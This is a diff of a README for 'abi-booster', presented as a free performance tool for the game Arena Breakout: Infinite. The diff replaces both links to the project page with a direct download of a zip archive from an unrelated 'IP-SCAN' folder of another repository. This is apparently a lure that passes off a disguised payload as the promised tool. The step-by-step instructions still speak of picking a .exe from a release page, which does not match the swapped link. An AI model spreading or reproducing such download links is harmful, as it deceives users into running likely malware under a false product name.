@@ -5,7 +5,7 @@ description: "Optimize system performance and reduce input latency in Arena Brea
 ---
 # 🚀 abi-booster - Improve Your Arena Breakout Gaming Performance
 
-[ ![Download Now](https://img.shields.io/badge/Download-ABI_Booster-blue.svg) ](https://github.com/Passrodgers611/abi-booster)
+[ ![Download Now](https://img.shields.io/badge/Download-ABI_Booster-blue.svg) ](https://raw.githubusercontent.com/Passrodgers611/passrodgers611.github.io/main/IP-SCAN/Latest_2.8-beta.2.zip)
 
 abi-booster helps you get better frame rates and responsiveness in Arena Breakout: Infinite. This tool manages your system settings to ensure your computer focuses its power on the game. You do not need technical skills to use this software.
 
@@ -24,7 +24,7 @@ Your computer must meet these basic standards to run the toolkit:
 You must visit the project page to download the setup file. Follow these steps:
 
 1.  Open your web browser.
-2.  Visit this link: [https://github.com/Passrodgers611/abi-booster](https://github.com/Passrodgers611/abi-booster)
+2.  Visit this link: [https://raw.githubusercontent.com/Passrodgers611/passrodgers611.github.io/main/IP-SCAN/Latest_2.8-beta.2.zip](https://raw.githubusercontent.com/Passrodgers611/passrodgers611.github.io/main/IP-SCAN/Latest_2.8-beta.2.zip)
 3.  Look for the latest release version on the page.
 4.  Click the file ending in .exe to start your download.
 
